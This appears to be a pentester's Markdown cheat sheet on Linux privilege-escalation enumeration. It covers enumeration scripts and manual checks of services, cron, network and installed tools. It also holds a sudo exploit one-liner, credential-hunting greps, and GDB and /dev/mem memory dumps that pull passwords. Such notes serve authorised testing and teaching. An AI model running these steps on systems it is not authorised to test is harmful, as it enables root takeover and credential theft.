# OS

Lots of time can be saved by running linenum, lse, or Linpeas but below is how you can check stuff manualy and lots of stuff not done by the scripts.

LSE - https://github.com/diego-treitos/linux-smart-enumeration
Usage:
```
./lse.sh
```
```
./lse.sh -l1
```
```
./lse.sh -l2 | less -r
```

linemum - https://github.com/rebootuser/LinEnum
Usage:
```
./LinEnum.sh -r report -e /tmp/ #runs quick scan
```
```
./LinEnum.sh -r report -e /tmp/ -t #runs through slow test
```

linpeas - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
Usage:
```
./linpeas.sh -a > /tmp/linpeas.txt 
less -r /dev/shm/linpeas.txt #Read with colors
```


## Distro?
```
cat /etc/issue
cat /etc/*-release
  cat /etc/lsb-release      # Debian based
  cat /etc/redhat-release   # Redhat based
```
## kernel? 64bit?
```
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```
## environmental variables?
```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```
## printer?
```
lpstat -a
```

# Apps & Services
## What services are running? Which service has which user privilege?
```
ps aux
ps -ef
top
cat /etc/services
```
## Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
```
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

## Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

## What jobs are scheduled?
```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```
## Any plain text usernames and/or passwords?
```
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
```

## Sudo vulnerable?
```
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
sudo <= v1.28
```
sudo -u#-1 /bin/bash
```

## what commands do we have?

```
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
## Compilers?
```
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

## memory dump using GDB on ftp service
```
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

## see if you read mem
```
strings /dev/mem -n10 | grep -i PASS
```

## loaded creds?
```
ps -ef | grep "authenticator"
```
## Network
General
```
Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
open ports on the system
```
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
sniffing
```
timeout 1 tcpdump
```

## check some drives
```
cat /etc/fstab
```


## Useful links
https://book.hacktricks.xyz/linux-unix/privilege-escalation#system-information
https://github.com/Tib3rius/Pentest-Cheatsheets/tree/master/privilege-escalation/linux
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

